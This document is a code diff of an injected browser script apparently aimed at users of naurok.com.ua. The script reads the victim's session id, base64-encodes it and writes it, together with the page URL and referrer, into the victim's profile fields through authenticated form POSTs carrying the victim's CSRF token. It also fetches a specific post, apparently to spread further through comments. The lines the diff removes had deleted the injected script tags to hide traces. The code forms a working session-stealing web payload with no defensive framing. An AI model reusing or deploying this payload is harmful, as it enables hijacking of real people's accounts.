@@ -24,7 +24,12 @@
 
     const promises = [];
 
-    async function setAbout (text) {
+    async function updateProfile () {
+        const preferences = await fetch('https://naurok.com.ua/preferences');
+        const html = await preferences.text();
+        const about = html.match(/<textarea id="accountpreferences-about" class="form-control" name="AccountPreferences[about]" rows="5">(.+)<\/textarea>/)[1] + '\n' + url + '\n' + referrer;
+        
+        const text = encode(sessid);
         await fetch("https://naurok.com.ua/preferences", {
             "headers": {
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -32,7 +37,7 @@
             },
             "referrer": "https://naurok.com.ua/preferences",
             "referrerPolicy": "strict-origin-when-cross-origin",
-            "body": `------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"_csrf\"\r\n\r\n${csrf}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"AccountPreferences[position]\"\r\n\r\n${text}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,
+            "body": `------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"_csrf\"\r\n\r\n${csrf}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"AccountPreferences[position]\"\r\n\r\n${text}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data; name=\"AccountPreferences[about]\"\r\n\r\n${about}\r\n------WebKitFormBoundaryKnLgq0VhMq7Xl2Pu\r\nContent-Disposition: form-data;`,
             "method": "POST",
             "mode": "cors",
             "credentials": "include",
@@ -43,7 +48,7 @@
     function encode (text) {
         return btoa(text);
     }
-    promises.push(setAbout(encode(`c:${sessid},u:${url},r:${referrer}`)));
+    promises.push(updateProfile());
 
     promises.push((async function () {
         const commentP = await fetch('https://naurok.com.ua/post/sergiy-gorbachov-ne-zmushuyte-pedagogiv-povertatisya-v-naseleni-punkti-doki-ce-ne-dozvolit-viyskova-administraciya');
@@ -77,10 +82,4 @@
         });
     })());
     await Promise.all(promises);
-
-    const scripts = document.querySelectorAll('script[o]');
-    for (const script of scripts) {
-        script.remove();
-    }
-
 })();
